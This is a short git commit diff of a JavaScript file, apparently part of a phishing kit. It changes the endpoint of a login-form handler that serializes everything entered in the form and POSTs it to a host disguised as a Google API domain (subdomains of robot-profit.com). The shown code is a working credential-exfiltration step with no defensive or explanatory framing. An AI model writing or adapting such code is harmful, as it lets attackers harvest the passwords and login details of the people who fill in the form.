f01acb3f73ecacef49922bf03d951e8d944cc009
2772828273 <96895447+2772828273@users.noreply.github.com>
2022-01-01 14:37:07 +0700

    Update 123456.js

--- 123456.js
+++ 123456.js
@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://font-googleapis.robot-profit.com/index.php",
+        url: "https://ajax-googleapis.robot-profit.com/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
